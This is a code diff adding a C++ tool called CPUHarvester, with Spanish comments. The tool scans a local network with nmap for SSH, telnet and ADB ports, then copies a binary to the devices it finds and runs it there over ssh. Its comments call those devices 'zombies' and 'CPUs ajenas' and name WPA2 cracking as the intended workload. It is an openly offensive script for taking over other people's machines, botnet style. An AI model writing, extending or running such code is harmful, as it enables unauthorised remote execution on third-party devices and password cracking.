@@ -1,0 +1,47 @@
+#include <iostream>
+#include <vector>
+#include <string>
+#include <thread>
+
+class CPUHarvester {
+public:
+    struct ForeignNode {
+        std::string ip;
+        int cores;
+        float load;
+    };
+
+    // Escanea la red local para identificar CPUs disponibles (nodos "zombies")
+    void scan_for_compute_nodes() {
+        std::cout << "🔍 Buscando potencia de cómputo en la red local..." << std::endl;
+        // Usamos nmap integrado en tu Kali para detectar puertos de ejecución remota
+        system("nmap -sV -p 22,23,5555 --open 192.168.1.0/24 -oG targets.txt");
+    }
+
+    // Distribuye una tarea pesada (ej. Cracking de WPA2) entre los nodos encontrados
+    void distribute_task(std::string binary_path, std::vector<std::string> nodes) {
+        std::cout << "🏗️ Distribuyendo carga de trabajo a " << nodes.size() << " núcleos externos..." << std::endl;
+        
+        for (const auto& ip : nodes) {
+            // Enviamos el binario compilado en nuestro Bridge de C++ al nodo ajeno
+            std::string cmd = "scp " + binary_path + " user@" + ip + ":/tmp/task && ssh user@" + ip + " '/tmp/task' &";
+            system(cmd.c_str());
+        }
+    }
+
+    // Monitor de salud: Si un nodo ajeno se apaga, reasigna la tarea
+    void watchdog_nodes() {
+        std::cout << "🛡️ Vigilando estabilidad de CPUs ajenas..." << std::endl;
+        // Si el 'ping' falla, el C++ mueve la carga a otro dispositivo
+    }
+};
+
+int main() {
+    CPUHarvester harvester;
+    harvester.scan_for_compute_nodes();
+    
+    std::vector<std::string> discovered_ips = {"192.168.1.15", "192.168.1.42"};
+    harvester.distribute_task("./heavy_worker", discovered_ips);
+
+    return 0;
+}
